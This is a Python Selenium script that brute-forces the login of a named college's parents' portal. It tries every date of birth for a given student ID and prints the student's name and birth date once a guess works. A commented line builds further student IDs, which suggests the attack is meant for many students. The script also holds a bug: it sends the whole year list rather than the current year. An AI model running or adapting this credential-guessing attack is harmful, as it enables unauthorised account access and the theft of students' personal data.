from selenium import webdriver
from bs4 import BeautifulSoup
import requests
import time

B_URL = "./chromedriver.exe"
T_URL = "https://parents.msrit.edu/parents_even2022/"
DEPT = "IS"
browser = webdriver.Chrome(executable_path=B_URL)
browser.get(T_URL)
months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']

year = ["2003", "2001"]
usn = "1MS21CI049"
success = 0
# usn = f"1MS20{DEPT}{k:03}"
for l in year:
	for j in months:
		for i in range(1, 32):
			username = browser.find_element_by_id("username")
			dd = browser.find_element_by_id("dd")
			mm = browser.find_element_by_id("mm")
			yyyy = browser.find_element_by_id("yyyy")
			login = browser.find_elements_by_tag_name("input")[6]
			username.send_keys(f"{usn}")
			dd.send_keys(f"{i:02}")
			mm.send_keys(f"{j}")
			yyyy.send_keys(f"{year}")
			login.click()
			try:
				name = browser.find_element_by_tag_name("h3")
				if name.text != "Notice Board":
					success = 1
					data = f"{usn}{name.text} date of birth is {i:02} {j} {year}\n"
					datap = f'{usn}, {name.text}, {i:02}/{j}/{year}\n'
					print(data)
			except Exception as e:
				print(e)
				browser.back()
			if success == 1:
				break
		if success == 1:
			break
